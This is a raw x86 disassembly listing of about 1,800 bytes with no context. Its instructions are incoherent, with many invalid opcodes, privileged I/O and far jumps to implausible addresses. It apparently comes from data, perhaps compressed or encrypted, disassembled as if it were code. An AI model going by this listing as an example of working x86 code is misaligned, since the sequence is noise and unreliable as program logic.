  42048e:	cli    
  42048f:	loopne 0x42048c
  420491:	addr16 add al,cl
  420494:	add    DWORD PTR [ecx],ebx
  420496:	imul   ecx,esp,0x5e
  420499:	out    dx,eax
  42049a:	test   edi,0x5cd2ddef
  4204a0:	stc    
  4204a1:	sbb    ecx,DWORD PTR [esi-0x3bc3ba00]
  4204a7:	mov    eax,edi
  4204a9:	and    BYTE PTR [esi-0x2d5a0fbf],ch
  4204af:	push   cs
  4204b0:	mov    bh,0x11
  4204b2:	cld    
  4204b3:	lods   al,BYTE PTR ds:[esi]
  4204b4:	add    edi,DWORD PTR [eax+0x3bc4b06e]
  4204ba:	push   esp
  4204bb:	mov    es,ebp
  4204bd:	fs jae 0x420524
  4204c0:	(bad)  
  4204c1:	stos   DWORD PTR es:[edi],eax
  4204c2:	mov    dl,BYTE PTR [ebx+0x1b]
  4204c5:	cld    
  4204c6:	sub    esi,DWORD PTR [ebp-0x551bfac7]
  4204cc:	pushf  
  4204cd:	jp     0x4204d4
  4204cf:	arpl   WORD PTR [ebx+0x1bfdd938],sp
  4204d5:	push   ds
  4204d6:	mov    bl,0x82
  4204d8:	data16 jno 0x420537
  4204db:	add    eax,0x336b9dc
  4204e0:	es leave 
  4204e2:	xor    ah,bh
  4204e4:	xor    al,0xda
  4204e6:	sahf   
  4204e7:	jns    0x420535
  4204e9:	jmp    0x3b1:0xd07d034
  4204f0:	jbe    0x420565
  4204f2:	call   0xd9dc9703
  4204f7:	fist   DWORD PTR [ecx]
  4204f9:	xor    ch,BYTE PTR [edx+0x143e5b8d]
  4204ff:	jbe    0x4204ef
  420501:	and    BYTE PTR [ebx+0x2f48904b],0xdf
  420508:	jp     0x42057a
  42050a:	pop    ebx
  42050b:	repnz popf 
  42050d:	push   ss
  42050e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42050f:	mov    bl,0x42
  420511:	fwait
  420512:	retf   0x28fe
  420515:	gs cmc 
  420517:	fimul  DWORD PTR ds:0xcce3bd66
  42051d:	push   esp
  42051e:	inc    edx
  42051f:	mov    ebp,0x27536c03
  420524:	lahf   
  420525:	loope  0x420556
  420527:	dec    eax
  420528:	or     al,0xa8
  42052a:	mov    dh,bl
  42052c:	mov    WORD PTR [esi-0x7206ea77],gs
  420532:	rcr    edx,cl
  420534:	repnz mov bh,0x16
  420537:	pop    ss
  420538:	imul   esi,DWORD PTR [edi],0xec3db97c
  42053e:	mov    BYTE PTR es:[ecx+ebp*8],al
  420542:	or     ebx,edx
  420544:	xor    al,BYTE PTR [ecx]
  420546:	push   esp
  420547:	sub    eax,0x8c0554ca
  42054c:	push   0xe1b8172d
  420551:	xchg   BYTE PTR [ebx+0x794c0b4e],al
  420557:	sar    BYTE PTR [eax+0x76],0xcb
  42055b:	pop    ebp
  42055c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42055d:	loop   0x420530
  42055f:	sti    
  420560:	xchg   ebx,eax
  420561:	mov    bl,0x7
  420563:	jp     0x4204fd
  420565:	xchg   cl,al
  420567:	push   edx
  420568:	rcl    ch,cl
  42056a:	jg     0x420541
  42056c:	sub    al,0xb5
  42056e:	and    BYTE PTR [ecx],0x18
  420571:	mov    edi,DWORD PTR [edi-0x63]
  420574:	xor    eax,0xdd8ab94a
  420579:	fimul  WORD PTR [ebx]
  42057b:	pop    esi
  42057c:	push   es
  42057d:	test   al,0x7
  42057f:	mov    edi,0xbb46c1d3
  420584:	xlat   BYTE PTR ds:[ebx]
  420585:	ins    DWORD PTR es:[edi],dx
  420586:	(bad)  
  420587:	lods   eax,DWORD PTR ds:[esi]
  420588:	fild   WORD PTR [edx+0x683ab58d]
  42058e:	adc    eax,DWORD PTR [edx+0xbd6df0c]
  420594:	icebp  
  420595:	sahf   
  420596:	adc    dl,ch
  420598:	fistp  DWORD PTR [eax]
  42059b:	shr    cl,cl
  42059d:	daa    
  42059e:	fcmovnb st,st(6)
  4205a0:	jge    0x420609
  4205a2:	clc    
  4205a3:	repz push fs
  4205a6:	cmc    
  4205a7:	int    0x96
  4205a9:	xor    al,0xd2
  4205ab:	jmp    0x4205b6
  4205ad:	mov    ebp,0x9dcaeee2
  4205b2:	aas    
  4205b3:	sbb    ebx,DWORD PTR [eax]
  4205b5:	inc    esp
  4205b6:	ss mov al,bh
  4205b9:	popa   
  4205ba:	sub    ebx,ecx
  4205bc:	pop    ecx
  4205bd:	mov    bl,0xe5
  4205bf:	or     eax,0x3e96e7cd
  4205c4:	push   es
  4205c5:	cmp    al,0x0
  4205c7:	dec    esp
  4205c8:	enter  0x6f7e,0xc7
  4205cc:	dec    esi
  4205cd:	stos   BYTE PTR es:[edi],al
  4205ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205cf:	aas    
  4205d0:	mov    ah,0xcb
  4205d2:	jp     0x4205a9
  4205d4:	pop    ds
  4205d5:	arpl   WORD PTR [eax+0x409a4d58],dx
  4205db:	in     al,0x14
  4205dd:	ss xchg edx,eax
  4205df:	xor    BYTE PTR [edi+0xc77b473],0xb1
  4205e6:	mov    WORD PTR [edi+0x7530c82e],ds
  4205ec:	adc    eax,0x99b435df
  4205f1:	xlat   BYTE PTR ds:[ebx]
  4205f2:	pop    ds
  4205f3:	sahf   
  4205f4:	dec    ecx
  4205f5:	mov    ebx,0x55c37459
  4205fa:	loopne 0x4205bb
  4205fc:	sbb    ch,BYTE PTR [eax-0xa]
  4205ff:	arpl   WORD PTR [ebp+0x64b968b2],sp
  420605:	xor    dh,bh
  420607:	jg     0x4205a3
  420609:	inc    esi
  42060a:	adc    BYTE PTR [ebx-0x3f],ah
  42060d:	stc    
  42060e:	xlat   BYTE PTR ds:[ebx]
  42060f:	inc    eax
  420610:	(bad)  
  420612:	push   eax
  420613:	xor    BYTE PTR [ebp+0x6fb691d5],ah
  420619:	jo     0x420609
  42061b:	jbe    0x42067f
  42061d:	dec    DWORD PTR [ecx]
  42061f:	or     BYTE PTR [esi-0x705a335],bl
  420625:	pop    ss
  420626:	(bad)  
  420627:	(bad)  
  420628:	stos   BYTE PTR es:[edi],al
  420629:	not    BYTE PTR [edx-0x2ba56eeb]
  42062f:	dec    eax
  420630:	jmp    0x48e21b45
  420635:	jp     0x4205ed
  420637:	cmp    eax,0xc3f4ad8e
  42063c:	cmp    BYTE PTR [esi+0x75a9ee51],0xa4
  420643:	rol    bl,0xcb
  420646:	pop    esp
  420647:	mov    ebp,0xbe44af0d
  42064c:	jp     0x4206ac
  42064e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42064f:	mov    eax,0xb3489eee
  420654:	xchg   DWORD PTR ds:0x998c4dd2,ebp
  42065a:	in     al,0x9a
  42065c:	pop    ds
  42065d:	mov    ebx,0x8f18b44a
  420662:	mov    ebp,0x3761e2fa
  420667:	aam    0xb4
  420669:	out    dx,eax
  42066a:	sbb    al,dh
  42066c:	das    
  42066d:	dec    eax
  42066e:	mov    bl,0x7c
  420670:	lods   al,BYTE PTR ds:[esi]
  420671:	xlat   BYTE PTR ds:[ebx]
  420672:	and    cl,BYTE PTR [edi+0x6d0f7d9b]
  420678:	arpl   WORD PTR [esi+ebx*8-0x7ce68296],di
  42067f:	clc    
  420680:	repz retf 0x972d
  420684:	call   0x94923ff2
  420689:	cdq    
  42068a:	lahf   
  42068b:	leave  
  42068c:	sub    ecx,ecx
  42068e:	popf   
  42068f:	into   
  420690:	jmp    0xd956b709
  420695:	test   BYTE PTR [ecx+0x5c385bcd],0xf6
  42069c:	mov    dl,0xc3
  42069e:	pminub mm3,QWORD PTR ds:0x5c22
  4206a4:	push   edi
  4206a5:	cmp    edi,edi
  4206a7:	mov    al,0xbe
  4206a9:	int3   
  4206aa:	push   ss
  4206ab:	ins    DWORD PTR es:[edi],dx
  4206ac:	arpl   WORD PTR [edi-0xb109b37],di
  4206b2:	into   
  4206b3:	rcr    al,cl
  4206b5:	clc    
  4206b6:	jp     0x42065e
  4206b8:	popf   
  4206b9:	sbb    BYTE PTR [edx],0x49
  4206bc:	xlat   BYTE PTR ds:[ebx]
  4206bd:	adc    ecx,DWORD PTR [ecx]
  4206bf:	dec    esp
  4206c0:	adc    esi,edi
  4206c2:	shl    DWORD PTR [edx],1
  4206c4:	(bad)  
  4206c5:	jle    0x420740
  4206c7:	push   edx
  4206c8:	dec    ecx
  4206c9:	mov    ds:0x89e90808,al
  4206ce:	xchg   DWORD PTR [esi+0x29],edx
  4206d1:	aam    0x11
  4206d3:	out    0xb8,al
  4206d5:	popa   
  4206d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206d7:	adc    BYTE PTR [ebx+0x743ceef2],dl
  4206dd:	sub    al,0x39
  4206df:	mov    dh,0x6c
  4206e1:	in     eax,dx
  4206e2:	cmp    BYTE PTR [edx-0x80],bh
  4206e5:	inc    ebp
  4206e6:	push   0xfee7c76c
  4206eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206ec:	ja     0x42069f
  4206ee:	push   ebx
  4206ef:	jl     0x420751
  4206f1:	retf   
  4206f2:	sub    ebp,DWORD PTR [esi-0x6b]
  4206f5:	test   cl,0x6
  4206f8:	sub    ch,BYTE PTR [esi]
  4206fa:	iret   
  4206fb:	dec    esp
  4206fc:	jnp    0x420779
  4206fe:	add    eax,0xf1c87977
  420703:	mov    eax,0x6e9297d2
  420708:	xchg   bh,dh
  42070a:	cmp    ebx,DWORD PTR [ecx]
  42070c:	nop
  42070d:	inc    esi
  42070e:	bound  esi,QWORD PTR [edx+0x7ceb3113]
  420714:	push   ebp
  420715:	sub    ebp,DWORD PTR [eax+0x705b5da0]
  42071b:	add    BYTE PTR [ebx-0x1a],0x90
  42071f:	mov    bl,0x25
  420721:	sub    al,0x67
  420723:	repnz xchg esi,eax
  420725:	sar    BYTE PTR [ebp+0x27],cl
  420728:	and    BYTE PTR [eax+0x21da805a],dh
  42072e:	ja     0x420702
  420730:	and    esp,DWORD PTR [ebx+0x74ab2a86]
  420736:	fild   QWORD PTR [ebp-0x7b]
  420739:	adc    DWORD PTR [esi],eax
  42073b:	stc    
  42073c:	fstp   QWORD PTR [esi]
  42073e:	mov    ebx,0xe1ecec0e
  420743:	jmp    0x420760
  420745:	sub    esi,DWORD PTR [edi]
  420747:	push   eax
  420748:	aas    
  420749:	shr    ecx,0xd1
  42074c:	fmul   QWORD PTR [esp+edx*2]
  42074f:	into   
  420750:	add    bh,0xbc
  420753:	ins    DWORD PTR es:[edi],dx
  420754:	packsswb mm2,mm2
  420757:	xchg   DWORD PTR [ebp+0x4351d103],ebp
  42075d:	test   esi,edi
  42075f:	daa    
  420760:	ds rcr ch,0x8b
  420764:	xor    BYTE PTR [ebx-0x39],cl
  420767:	push   edx
  420768:	xchg   DWORD PTR [ecx-0xb073c30],ebp
  42076e:	mov    esi,ebp
  420770:	jmp    DWORD PTR [edx+0x7f1b6e20]
  420776:	xchg   esp,eax
  420777:	jbe    0x4207d3
  420779:	test   eax,0x6807d56e
  42077e:	lea    edx,[ebp-0xb]
  420781:	inc    esp
  420782:	and    DWORD PTR [esi-0x3a],eax
  420785:	xchg   ebp,eax
  420786:	and    al,0xec
  420788:	fwait
  420789:	cdq    
  42078a:	and    BYTE PTR [ecx+0x56626f2d],dh
  420790:	push   ds
  420791:	enter  0x9cd5,0xac
  420795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420797:	ja     0x420816
  420799:	lock adc eax,0xfad9a858
  42079f:	and    al,0x66
  4207a1:	pop    eax
  4207a2:	stos   DWORD PTR es:[edi],eax
  4207a3:	or     BYTE PTR ds:0xe552ca3d,bl
  4207a9:	push   es
  4207aa:	int    0xdb
  4207ac:	dec    ecx
  4207ad:	jecxz  0x42075f
  4207af:	ficom  WORD PTR [esp+esi*8-0x5d3653b4]
  4207b6:	push   0xba5c9afe
  4207bb:	popa   
  4207bc:	enter  0xf90b,0xfe
  4207c0:	fnstcw WORD PTR gs:[esi]
  4207c3:	loope  0x4207c6
  4207c5:	out    0xd2,al
  4207c7:	jno    0x420811
  4207c9:	jmp    0xbae:0xd216008a
  4207d0:	fld    QWORD PTR [ecx-0x9]
  4207d3:	and    DWORD PTR ds:0x5eeea852,ecx
  4207d9:	lea    ecx,[ebx-0x6e0f7ad4]
  4207df:	arpl   WORD PTR [eax],cx
  4207e1:	rcl    ebx,1
  4207e3:	xor    cl,al
  4207e5:	fcom   DWORD PTR [edi]
  4207e7:	ins    DWORD PTR es:[edi],dx
  4207e8:	or     al,0x43
  4207ea:	shl    DWORD PTR [edx+edx*1],cl
  4207ed:	jg     0x4207d8
  4207ef:	mov    al,0xc7
  4207f1:	scas   al,BYTE PTR es:[edi]
  4207f2:	hlt    
  4207f3:	dec    eax
  4207f4:	inc    edx
  4207f5:	inc    eax
  4207f6:	xchg   esp,esp
  4207f8:	sub    bl,BYTE PTR [edx]
  4207fa:	(bad)  
  4207fb:	cli    
  4207fc:	pop    ebx
  4207fd:	xor    eax,0x8978ab45
  420802:	loope  0x42082b
  420804:	jl     0x4207b4
  420806:	fmul   st(4),st
  420808:	adc    BYTE PTR [edx+0x7ff14658],bh
  42080e:	xchg   ecx,eax
  42080f:	or     ecx,DWORD PTR gs:[edx+0x68d501ee]
  420816:	xchg   ebp,eax
  420817:	int3   
  420818:	jns    0x4207c2
  42081a:	inc    esi
  42081b:	cmp    cl,BYTE PTR [ebp-0x7b76f008]
  420821:	pop    esi
  420822:	adc    al,dh
  420824:	sub    ecx,DWORD PTR [eax+0x7d7544ff]
  42082a:	and    dl,BYTE PTR [edx]
  42082c:	add    al,BYTE PTR [ebp-0x757941bd]
  420832:	dec    esp
  420833:	jnp    0x420817
  420835:	std    
  420836:	fisub  DWORD PTR [ebx+0x6c21025a]
  42083c:	mov    edi,DWORD PTR [edi]
  42083e:	xor    al,0x85
  420840:	out    0xe0,eax
  420842:	mov    ah,0xf7
  420844:	cs ja  0x42088b
  420847:	mov    edi,0xa26f1ee4
  42084c:	add    al,0xc4
  42084e:	loop   0x420892
  420850:	or     eax,0x6e65b5f
  420855:	(bad)  
  420856:	dec    esi
  420857:	cmp    ah,BYTE PTR [esi-0x94d0c03]
  42085d:	pop    esi
  42085e:	repnz mov ah,0x1c
  420861:	jns    0x420819
  420863:	nop
  420864:	sahf   
  420865:	fidiv  WORD PTR [ebx-0x19]
  420868:	add    al,0x42
  42086a:	nop
  42086b:	inc    edi
  42086c:	cs (bad) 
  42086f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420870:	xlat   BYTE PTR ds:[ebx]
  420871:	lods   al,BYTE PTR ds:[esi]
  420872:	mov    ds:0x701f2937,al
  420877:	xchg   DWORD PTR [esi],edx
  420879:	mov    eax,ds:0x9036341f
  42087e:	(bad)  
  42087f:	dec    edi
  420880:	xor    al,0xed
  420882:	and    edx,0x3a2248b9
  420888:	mov    gs,edx
  42088a:	fs jae 0x42083c
  42088d:	inc    esi
  42088e:	adc    eax,0x816aa48
  420893:	icebp  
  420894:	pusha  
  420895:	jecxz  0x4208b5
  420897:	fist   DWORD PTR [esi+edi*2]
  42089a:	repnz imul ebp,eax,0xd4855056
  4208a1:	mov    esi,0xaa13fa8c
  4208a6:	leave  
  4208a7:	mov    cx,0x8f82
  4208ab:	div    DWORD PTR [ecx+0x39]
  4208ae:	xchg   esi,eax
  4208af:	mov    dl,0x1
  4208b1:	sub    cl,dh
  4208b3:	xchg   ebx,eax
  4208b4:	leave  
  4208b5:	push   cs
  4208b6:	pop    ds
  4208b7:	xor    ebx,0x26
  4208ba:	dec    esi
  4208bb:	xchg   ebx,eax
  4208bc:	inc    esp
  4208bd:	sub    edi,DWORD PTR [eax+0x6e]
  4208c0:	xrelease mov BYTE PTR [ecx+0x3f],dh
  4208c4:	mov    bl,0x66
  4208c6:	inc    edx
  4208c7:	retf   0xbe16
  4208ca:	lahf   
  4208cb:	dec    ebx
  4208cc:	mov    ebx,0x5559c30
  4208d1:	xor    DWORD PTR gs:[ebp-0x4e],edi
  4208d5:	call   0xfa86:0x49625298
  4208dc:	pop    esp
  4208dd:	test   DWORD PTR [ecx-0x1b7b3cb1],ebx
  4208e3:	imul   ebx,DWORD PTR [ebp+0xf],0xf9060663
  4208ea:	xor    BYTE PTR [ecx],0x6d
  4208ed:	mov    esi,fs
  4208ef:	pop    ss
  4208f0:	inc    esi
  4208f1:	push   ebx
  4208f2:	lock lds ebx,FWORD PTR [ebx-0x24]
  4208f6:	xor    edi,DWORD PTR gs:[edx+0x7d184ee0]
  4208fd:	lods   eax,DWORD PTR ds:[esi]
  4208fe:	and    DWORD PTR [edx],eax
  420900:	push   0xffffff9e
  420902:	int    0x53
  420904:	lods   al,BYTE PTR ds:[esi]
  420905:	and    BYTE PTR [esi-0x1b],dh
  420908:	comiss xmm2,xmm4
  42090b:	xor    ch,dl
  42090d:	int3   
  42090e:	pop    ebp
  42090f:	int3   
  420910:	sbb    eax,0xca30e512
  420915:	sahf   
  420916:	test   BYTE PTR [ecx-0x6b8332e2],ah
  42091c:	and    eax,0xfb7b74d6
  420921:	div    BYTE PTR [edi-0xe]
  420924:	lods   eax,DWORD PTR ds:[esi]
  420925:	add    ecx,esp
  420927:	mov    ds:0x3e900e4c,al
  42092c:	inc    esp
  42092d:	shl    bl,cl
  42092f:	in     al,0xaa
  420931:	js     0x42091d
  420933:	hlt    
  420934:	ja     0x4208f9
  420936:	xchg   DWORD PTR [edx-0x4f],ebx
  420939:	mov    eax,ds:0x9aca90cb
  42093e:	xchg   ecx,eax
  42093f:	cmp    DWORD PTR [eax-0x416b2fb7],edx
  420945:	into   
  420946:	adc    eax,0x17b1ef04
  42094b:	out    dx,al
  42094c:	dec    ebx
  42094d:	in     al,0xcd
  42094f:	pusha  
  420950:	mov    bl,0x2e
  420952:	and    BYTE PTR [ecx+ebp*1-0x30723114],dl
  420959:	ins    BYTE PTR es:[edi],dx
  42095a:	xchg   esp,eax
  42095b:	cli    
  42095c:	mov    ecx,DWORD PTR [edx]
  42095e:	inc    ebx
  42095f:	xlat   BYTE PTR ds:[ebx]
  420960:	inc    edx
  420961:	or     al,0xdb
  420963:	(bad)  
  420964:	(bad)  
  420965:	aaa    
  420966:	pop    ebx
  420967:	inc    ebp
  420968:	jmp    0x9424d51b
  42096d:	and    dl,BYTE PTR [ecx]
  42096f:	cmp    BYTE PTR [esi+0x1b],bl
  420972:	mov    ecx,0xddbf5b24
  420977:	test   DWORD PTR [esi],ebp
  420979:	xor    al,0xcf
  42097b:	cli    
  42097c:	fsubr  st(1),st
  42097e:	mov    eax,0xd6d5a7f9
  420983:	pop    ecx
  420984:	push   ecx
  420985:	dec    edx
  420986:	pop    edx
  420987:	ins    DWORD PTR es:[edi],dx
  420988:	enter  0x7218,0x15
  42098c:	mov    ah,0xa5
  42098e:	adc    eax,0x13d3a9e3
  420993:	into   
  420994:	mov    ecx,0x5378fa1e
  420999:	enter  0xe3e,0xc4
  42099d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42099e:	test   BYTE PTR [esi+0x62],dh
  4209a1:	test   BYTE PTR [esi+0x60],0x43
  4209a5:	fwait
  4209a6:	xor    eax,0x86c7069a
  4209ab:	or     eax,0x60688ac2
  4209b0:	jne    0x42098b
  4209b2:	stos   DWORD PTR es:[edi],eax
  4209b3:	fistp  QWORD PTR [eax-0x35]
  4209b6:	fdiv   QWORD PTR [ecx]
  4209b8:	test   edi,edx
  4209ba:	retf   
  4209bb:	mov    al,ds:0x12783199
  4209c0:	das    
  4209c1:	std    
  4209c2:	jns    0x420a43
  4209c4:	in     al,dx
  4209c5:	jge    0x420a34
  4209c7:	pop    edx
  4209c8:	stos   DWORD PTR es:[edi],eax
  4209c9:	lock out dx,al
  4209cb:	loopne 0x420a38
  4209cd:	inc    edi
  4209ce:	daa    
  4209cf:	ret    
  4209d0:	add    esi,edi
  4209d2:	rcl    BYTE PTR [ebx],1
  4209d4:	out    dx,al
  4209d5:	fdivr  st,st(6)
  4209d7:	(bad)  
  4209d8:	push   esp
  4209d9:	shr    DWORD PTR [ebx+0x3f],cl
  4209dc:	xchg   esp,eax
  4209dd:	out    0x5f,eax
  4209df:	out    0xd4,eax
  4209e1:	add    DWORD PTR [edi+0x6a],ecx
  4209e4:	push   ebx
  4209e5:	popa   
  4209e6:	jb     0x4209e0
  4209e8:	fild   DWORD PTR [ebx+0x4f]
  4209eb:	clc    
  4209ec:	pop    esp
  4209ed:	cs jnp 0x420a52
  4209f0:	lahf   
  4209f1:	(bad)  
  4209f2:	ins    BYTE PTR es:[edi],dx
  4209f3:	push   cs
  4209f4:	mov    ecx,0x93c2ee98
  4209f9:	inc    edx
  4209fa:	inc    edx
  4209fb:	leave  
  4209fc:	inc    esp
  4209fd:	mov    ah,0x48
  4209ff:	jmp    0x35b5:0xf93fdb8c
  420a06:	jle    0x4209a0
  420a08:	sub    bh,BYTE PTR [ebp-0x15]
  420a0b:	call   0xe4f3:0x63b87b95
  420a12:	test   eax,0x48898823
  420a17:	cli    
  420a18:	fisttp DWORD PTR [edx+edi*1-0x4e]
  420a1c:	ret    0xace6
  420a1f:	xchg   ebx,eax
  420a20:	(bad)  
  420a21:	jmp    0x23fc63a6
  420a26:	aaa    
  420a27:	xchg   ecx,eax
  420a28:	cdq    
  420a29:	shl    BYTE PTR [esi-0x751f92f6],0x78
  420a30:	add    edi,DWORD PTR [ecx]
  420a32:	mov    ds:0x67faef8c,al
  420a37:	fdiv   DWORD PTR [edi]
  420a39:	rol    DWORD PTR [eax+ecx*4],0x5e
  420a3d:	das    
  420a3e:	mov    dh,0xf1
  420a40:	adc    BYTE PTR [ebx],dh
  420a42:	dec    edx
  420a43:	add    al,0x82
  420a45:	lds    ebx,FWORD PTR [esi+0x7cdf73b3]
  420a4b:	psllw  mm4,mm5
  420a4e:	gs inc edx
  420a50:	push   edx
  420a51:	(bad)  
  420a52:	jmp    0x420ab2
  420a54:	imul   ebx,DWORD PTR [ebp-0x4a],0xfffffff9
  420a58:	shl    BYTE PTR [eax],0x73
  420a5b:	ins    BYTE PTR es:[edi],dx
  420a5c:	mov    esp,0x31109c53
  420a61:	aas    
  420a62:	lds    edi,FWORD PTR [esi-0x3ae45ff6]
  420a68:	pop    eax
  420a69:	mov    eax,ds:0xadd2e29e
  420a6e:	or     dl,ah
  420a70:	in     al,dx
  420a71:	retf   
  420a72:	cmp    DWORD PTR [ebx],esi
  420a74:	gs retf 0xe068
  420a78:	adc    ebx,DWORD PTR [esp+ebx*1]
  420a7b:	push   ebx
  420a7c:	pop    ecx
  420a7d:	dec    ecx
  420a7e:	(bad)  
  420a7f:	lea    ebx,[eax]
  420a81:	pop    ebx
  420a82:	fs loop 0x420a1e
  420a85:	aad    0xf5
  420a87:	or     ebx,DWORD PTR [ecx]
  420a89:	mov    ch,0xaa
  420a8b:	stc    
  420a8c:	mov    dl,0x92
  420a8e:	jp     0x420aa7
  420a90:	adc    eax,0x8989657d
  420a95:	js     0x420a42
  420a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a98:	pop    eax
  420a99:	mov    al,0xcd
  420a9b:	push   ebp
  420a9c:	repnz mov bh,BYTE PTR [edx+0x3a]
  420aa0:	lock ror BYTE PTR [ebp+0x6b],cl
  420aa4:	fprem1 
  420aa6:	repnz mov al,ds:0xb1651e83
  420aac:	ror    DWORD PTR [ebp-0x41],1
  420aaf:	jnp    0x420a61
  420ab1:	jae    0x420a9a
  420ab3:	xchg   ecx,eax
  420ab4:	in     eax,0xa9
  420ab6:	mov    bl,0x30
  420ab8:	shl    DWORD PTR [ebp+0x50],0xd5
  420abc:	ss pusha 
  420abe:	mov    ecx,0x7537c427
  420ac3:	js     0x420b00
  420ac5:	dec    esi
  420ac6:	das    
  420ac7:	xor    al,0xf0
  420ac9:	in     al,0x1d
  420acb:	shl    BYTE PTR [eax-0x18],0xd5
  420acf:	leave  
  420ad0:	test   ah,0xd4
  420ad3:	cmp    eax,0x85eebc70
  420ad8:	inc    edx
  420ad9:	cs fldcw WORD PTR ds:[esi-0x7f]
  420ade:	mov    bl,0x66
  420ae0:	fldenv es:[ecx]
  420ae3:	out    0x82,eax
  420ae5:	loope  0x420b51
  420ae7:	or     BYTE PTR [edi-0x67],ch
  420aea:	mov    DWORD PTR [edi-0x60d48f2f],edi
  420af0:	in     al,0xea
  420af2:	lea    edi,[ecx+esi*8+0x67]
  420af6:	test   al,0x19
  420af8:	in     al,0x58
  420afa:	gs mov ecx,edx
  420afd:	and    edx,DWORD PTR [ecx-0x629214c8]
  420b03:	xchg   edx,eax
  420b04:	fsubr  QWORD PTR [ecx+0x6a]
  420b07:	cs sbb bl,bl
  420b0a:	xchg   edx,eax
  420b0b:	jnp    0x420b30
  420b0d:	xor    eax,0xa766cd58
  420b12:	call   DWORD PTR [ebp-0x2d741bbf]
  420b18:	iret   
  420b19:	xchg   edi,eax
  420b1a:	mov    ebp,0x40fb5f35
  420b1f:	jne    0x420b81
  420b21:	int    0xdc
  420b23:	rcr    BYTE PTR [eax+0x3205a929],1
  420b29:	push   esi
  420b2a:	dec    eax
  420b2b:	pushf  
  420b2c:	lea    esi,[ebx+0x6a664c80]
  420b32:	jb     0x420af0
  420b34:	jmp    0x2ed1:0x38fae506
  420b3b:	jno    0x420b03
  420b3d:	sti    
  420b3e:	sub    edi,DWORD PTR [ebx-0x26b97093]
  420b44:	jnp    0x420b5d
  420b46:	out    dx,al
  420b47:	and    eax,0x6a405991
  420b4c:	push   ecx
  420b4d:	cmc    
  420b4e:	xor    dl,ch
  420b50:	inc    edx
  420b51:	dec    eax
  420b52:	(bad)  
  420b53:	fistp  QWORD PTR [eax+esi*1]
  420b56:	retf   0x85ec
  420b59:	jmp    0x71d4ac0
  420b5e:	sub    dl,dl
  420b60:	push   ecx
  420b61:	fbld   TBYTE PTR [eax]
  420b63:	or     edx,DWORD PTR [edx]
  420b65:	retf   0xbaf9
  420b68:	ja     0x420b05
  420b6a:	mov    eax,0xb7bbfc76
  420b6f:	les    edx,FWORD PTR [ecx-0x9]
  420b72:	test   al,0xba
  420b74:	(bad)  [ebx-0x11]
  420b77:	sbb    dl,BYTE PTR [eax]
  420b79:	push   es
  420b7a:	inc    eax
  420b7b:	fild   QWORD PTR [esi+0x323682c7]
  420b81:	loope  0x420b0e
  420b83:	jmp    0x420bf7
  420b85:	popa   
  420b86:	shl    BYTE PTR [edi-0x283c4202],0x17
  420b8d:	out    dx,al
  420b8e:	cmp    ch,BYTE PTR [edx+ecx*1-0x57693db]
  420b95:	jb     0x420b6c
  420b97:	leave  
  420b98:	inc    edx
  420b99:	mov    edx,0x2bc85483
  420b9e:	and    al,0xf1
  420ba0:	fidiv  WORD PTR [esi]
  420ba2:	into   
  420ba3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ba4:	mov    dl,0x36
  420ba6:	rcl    BYTE PTR [ecx+0x3470019],1
  420bac:	jecxz  0x420be3
  420bae:	inc    esp
  420baf:	cmp    ah,BYTE PTR [ecx+0x669cfc97]
  420bb5:	sub    eax,0xdb252d83
  420bba:	in     al,0xf9
  420bbc:	sahf   
  420bbd:	je     0x420b9e
  420bbf:	or     ch,BYTE PTR [edx-0x79]
  420bc2:	lds    ecx,FWORD PTR [edx+0x4]
  420bc5:	cmp    dl,cl
  420bc7:	fnstcw WORD PTR [edi-0x71014577]
  420bcd:	push   ebx
  420bce:	lock cmp al,BYTE PTR [edx]
  420bd1:	cld    
  420bd2:	fistp  DWORD PTR [esi-0x3ebb5869]
  420bd8:	shl    BYTE PTR ds:0x6f069d3e,cl
  420bde:	inc    edi
  420bdf:	push   esp
  420be0:	mov    edx,0x2b7276d4
  420be5:	repz scas al,BYTE PTR es:[edi]
  420be7:	mov    eax,0xaddca896
  420bec:	mov    ecx,DWORD PTR [ebp+0x28dddc9b]
  420bf2:	retf   0xc44
  420bf5:	jecxz  0x420c04
  420bf7:	sbb    bh,ah
  420bf9:	and    bl,BYTE PTR [ebp-0x37227c31]
  420bff:	push   edx
  420c00:	adc    eax,0x794dc925
  420c05:	lods   eax,DWORD PTR ds:[esi]
  420c06:	fsubr  st(6),st
  420c08:	jmp    0x420c4c
  420c0a:	cwde   
  420c0b:	ret    
  420c0c:	push   edx
  420c0d:	mov    esp,0x576410d
  420c12:	add    DWORD PTR [ecx-0x5b],ecx
  420c15:	pop    eax
  420c16:	pop    ds
  420c17:	or     al,0x1b
  420c19:	adc    eax,0x6b50b7d7
  420c1e:	cmp    eax,0x8128ec6a
  420c23:	sbb    ebp,ebx
  420c25:	aam    0x4d
  420c27:	pushf  
  420c28:	pop    bx
  420c2a:	int    0x59
  420c2c:	scas   eax,DWORD PTR es:[edi]
  420c2d:	outs   dx,BYTE PTR ds:[esi]
  420c2e:	add    dl,dl
  420c30:	adc    al,0xd6
  420c32:	push   0x657f84c9
  420c37:	scas   eax,DWORD PTR es:[edi]
  420c38:	sub    dl,BYTE PTR [ebx+edx*4+0x7a]
  420c3c:	or     ebx,DWORD PTR [eax+0x34]
  420c3f:	pop    esp
  420c40:	and    eax,0x8759e09b
  420c45:	punpckhwd mm4,mm2
  420c48:	call   0xb5ae:0x9eeac83c
  420c4f:	daa    
  420c50:	mov    edx,0x355afe68
  420c55:	xchg   ebp,eax
  420c56:	push   eax
  420c57:	cdq    
  420c58:	mov    ebp,0xb0d997a4
  420c5d:	pop    ss
  420c5e:	sbb    ah,BYTE PTR [edi+0x826fe76]
  420c64:	inc    edx
  420c65:	jno    0x420cc6
  420c67:	jno    0x420cb4
  420c69:	xor    eax,0xc51a242a
  420c6e:	cmc    
